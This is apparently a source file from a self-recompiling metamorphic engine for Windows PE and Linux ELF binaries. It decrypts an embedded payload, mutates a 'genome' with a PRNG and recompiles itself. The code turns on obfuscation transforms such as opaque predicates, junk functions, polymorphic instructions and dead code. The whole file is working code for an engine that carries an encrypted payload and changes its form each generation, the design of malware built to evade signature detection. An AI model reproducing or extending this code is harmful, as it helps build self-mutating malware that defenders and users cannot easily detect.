// recomp_common.mc — shared preamble for self-recompiling PE/ELF.
//
// Both recompilers do the same 6-step preamble: bundle_open the embedded
// header, slice [carrier | payload | genome] via bundle_get, copy + mutate
// the genome, concat mcb+genome, invoke compile_main. The only runtime
// variation is the mutation PRNG seed (PE uses GetTickCount, ELF derives
// from genome).
//
// Caller responsibilities: parse cmdline + decide output path, set compile
// flags (CF_EMIT_MC | CF_ABS_PE / CF_ABS_ELF / etc.), and build the final
// binary from the populated CompileOutput.
//
// On success returns 0 and populates *out_co and *out_genome_copy (both owned
// by the caller).  On failure returns non-zero and leaves outputs zeroed.

// =============================================================================
//
// Recompile Prep & Compile
//
// =============================================================================

int recomp_prep_and_compile(int compile_flags,
                            int mut_seed_val,
                            struct CompileOutput* out_co,
                            char** out_genome_copy,
                            char** out_pay_data,
                            int* out_pay_size) {
    int mcb_size; int pay_size; int genome_size;
    char* mcb_data; char* pay_data; char* genome_data;
    char* genome_copy;
    char* mc_with_genome;
    int mc_with_genome_sz;
    int result;
    struct BundleHeader* h;

    out_co->bin_data = 0;
    out_co->bin_size = 0;
    out_co->mc_data  = 0;
    out_co->mc_size  = 0;
    *out_genome_copy = 0;
    *out_pay_data    = 0;
    *out_pay_size    = 0;

    // bundle_open validates magic + version and decrypts the payload region
    // in place via header.key. Components are then read via bundle_get.
    h = g_bundle_header;
    if (bundle_open(h) == 0) { return 1; }
    mcb_data    = bundle_get(h, BC_CARRIER, &mcb_size);
    pay_data    = bundle_get(h, BC_PAYLOAD, &pay_size);
    genome_data = bundle_get(h, BC_GENOME,  &genome_size);
    if (mcb_data == 0) { return 1; }

    // Copy + mutate genome (callers embed the mutated copy into their output)
    genome_copy = malloc(genome_size);
    mem_copy(genome_copy, genome_data, genome_size);
    if (genome_size > 0) {
        mut_seed(mut_seed_val);
        mutate_genome(genome_copy, genome_size);
    }

    // Derive transform flags from the (mutated) genome's expression_flags
    // gene. User-passed flags (from CLI) are preserved; the genome only
    // adds to the bitmask, so each generation gets full transforms even
    // when invoked with no command-line flags.
    compile_flags = compile_flags | build_flags_from_genome(genome_copy, genome_size);

    // Concat mcb + mutated genome, compile, free the combined buffer
    mc_with_genome_sz = mcb_size + genome_size;
    mc_with_genome = malloc(mc_with_genome_sz);
    mem_copy(mc_with_genome, mcb_data, mcb_size);
    if (genome_size > 0) {
        mem_copy(mc_with_genome + mcb_size, genome_copy, genome_size);
    }
    result = compile_main(0, mc_with_genome, mc_with_genome_sz, compile_flags, out_co);
    free(mc_with_genome);

    if (result != 0) {
        free(genome_copy);
        return result;
    }

    *out_genome_copy = genome_copy;
    *out_pay_data    = pay_data;
    *out_pay_size    = pay_size;
    return 0;
}

// =============================================================================
//
// Symbol Lookup
//
// Helpers for locating a global's data-section offset or a function's code
// offset by name in g_mod (the parsed Module). Used by the binary builders
// to patch the bundle directory and to compute the new entry point.
//
// =============================================================================

int find_global_offset_by_name(char* name) {
    int i;
    i = 0;
    while (i < g_mod->global_count) {
        if (g_mod->globals[i].name != 0
            && str_eq(g_mod->globals[i].name, name) != 0) {
            return g_global_offsets[i];
        }
        i = i + 1;
    }
    return -1;
}


// =============================================================================
//
// Command-line Parser
//
// Recognized arguments (same vocabulary on Win32 and Linux):
//   --ir-obfuscate-names   --ir-unfold       --ir-substitute
//   --ir-deadcode          --ir-nops
//   --ir-reorder-instrs    --ir-reorder-locals
//   --ir-reorder-blocks    --ir-reorder-funcs
//   --x86-poly-instrs      --x86-dead-code   --x86-opaque
//   --x86-junk-funcs       --x86-harmless-calls
//   --x86-shuffle-funcs
//   --verbose / -v
//   <output_path>          (first positional arg; falls back to default_path)
//
// Win32 reads GetCommandLineA(); Linux reads /proc/self/cmdline.
//
// Match logic is byte-position-based (e.g. arg_buf[5] == 'o' means --ir-o*).
// Every transform flag depends on these exact positions — verify the full
// flag table before changing the dispatch shape.
//
// =============================================================================

// Match a single cmdline token against the recompiler flag vocabulary.
// Returns 1 if matched (and OR'd into *flags), 0 otherwise.
int recomp_match_flag(char* arg_buf, int* flags) {
    if (arg_buf[0] == 45 && arg_buf[1] == 45) {
        if (arg_buf[2] == 105) { // --i...
            if (arg_buf[5] == 111) { *flags = *flags | CF_IR_OBFUSCATE_NAMES; return 1; }
            else if (arg_buf[5] == 117) { *flags = *flags | CF_IR_UNFOLD;          return 1; }
            else if (arg_buf[5] == 115) { *flags = *flags | CF_IR_SUBSTITUTE;      return 1; }
            else if (arg_buf[5] == 100) { *flags = *flags | CF_IR_DEADCODE;        return 1; }
            else if (arg_buf[5] == 110) { *flags = *flags | CF_IR_NOPS;            return 1; }
            else if (arg_buf[5] == 114 && arg_buf[15] == 105) { *flags = *flags | CF_IR_REORDER_INSTRS; return 1; }
            else if (arg_buf[5] == 114 && arg_buf[15] == 108) { *flags = *flags | CF_IR_REORDER_LOCALS; return 1; }
            else if (arg_buf[5] == 114 && arg_buf[15] == 98)  { *flags = *flags | CF_IR_REORDER_BLOCKS; return 1; }
            else if (arg_buf[5] == 114 && arg_buf[15] == 102) { *flags = *flags | CF_IR_REORDER_FUNCS;  return 1; }
        } else if (arg_buf[2] == 120) { // --x...
            if (arg_buf[6] == 112)      { *flags = *flags | CF_X86_POLY_INSTRS;    return 1; }
            else if (arg_buf[6] == 100) { *flags = *flags | CF_X86_DEAD_CODE;      return 1; }
            else if (arg_buf[6] == 111) { *flags = *flags | CF_X86_OPAQUE;         return 1; }
            else if (arg_buf[6] == 106) { *flags = *flags | CF_X86_JUNK_FUNCS;     return 1; }
            else if (arg_buf[6] == 104) { *flags = *flags | CF_X86_HARMLESS_CALLS; return 1; }
            else if (arg_buf[6] == 115) { *flags = *flags | CF_X86_SHUFFLE_FUNCS;  return 1; }
        } else if (arg_buf[2] == 118) { *flags = *flags | CF_VERBOSE; return 1; } // --v...
    } else if (arg_buf[0] == 45 && arg_buf[1] == 118) { // -v
        *flags = *flags | CF_VERBOSE;
        return 1;
    }
    return 0;
}

// Parse the recompiler command line. Sets *out_flags (initialized to
// CF_EMIT_MC) and writes the chosen output path into out_path. If no
// positional arg is given, falls back to default_path.
//
// out_path must have at least 260 bytes capacity.
void recomp_parse_cmdline(int* out_flags, char* out_path, char* default_path) {
    int flags;
    int got_path;
    char arg_buf[260];
    int wp;
    int i;

    flags = CF_EMIT_MC;
    got_path = 0;

#ifdef WIN32
    char* cmdline;
    char* p;

    cmdline = GetCommandLineA();
    p = cmdline;

    // Skip argv[0] (executable path; may be quoted)
    if (p[0] == 34) {
        p = p + 1;
        while (p[0] != 0 && p[0] != 34) { p = p + 1; }
        if (p[0] == 34) { p = p + 1; }
    } else {
        while (p[0] != 0 && p[0] != 32) { p = p + 1; }
    }

    while (p[0] != 0) {
        while (p[0] == 32) { p = p + 1; }
        if (p[0] == 0) { break; }
        wp = 0;
        // Re-zero arg_buf — the position-based checks (arg_buf[15] etc.)
        // must see only the current token's bytes.
        i = 0;
        while (i < 260) { arg_buf[i] = 0; i = i + 1; }
        while (p[0] != 0 && p[0] != 32 && wp < 259) {
            arg_buf[wp] = p[0]; wp = wp + 1; p = p + 1;
        }
        arg_buf[wp] = 0;

        if (recomp_match_flag(arg_buf, &flags) == 0 && arg_buf[0] != 45) {
            mem_copy(out_path, arg_buf, wp + 1);
            got_path = 1;
        }
    }
#endif

#ifdef LINUX
    char* buf;
    int fd;
    int total;
    char* p;
    char* end;

    buf = malloc(4096);
    fd = open("/proc/self/cmdline", 0);
    total = 0;
    if (fd >= 0) {
        total = read(fd, buf, 4095);
        close(fd);
        if (total < 0) { total = 0; }
    }
    buf[total] = 0;

    p = buf;
    end = buf + total;
    // Skip argv[0]
    while (p < end && p[0] != 0) { p = p + 1; }
    if (p < end) { p = p + 1; }

    while (p < end) {
        // Skip null padding between tokens
        while (p < end && p[0] == 0) { p = p + 1; }
        if (p >= end) { break; }
        wp = 0;
        i = 0;
        while (i < 260) { arg_buf[i] = 0; i = i + 1; }
        while (p < end && p[0] != 0 && wp < 259) {
            arg_buf[wp] = p[0]; wp = wp + 1; p = p + 1;
        }
        arg_buf[wp] = 0;

        if (recomp_match_flag(arg_buf, &flags) == 0 && arg_buf[0] != 45) {
            mem_copy(out_path, arg_buf, wp + 1);
            got_path = 1;
        }
    }
    free(buf);
#endif

    *out_flags = flags;
    if (got_path == 0) {
        mem_copy(out_path, default_path, str_len(default_path) + 1);
    }
}
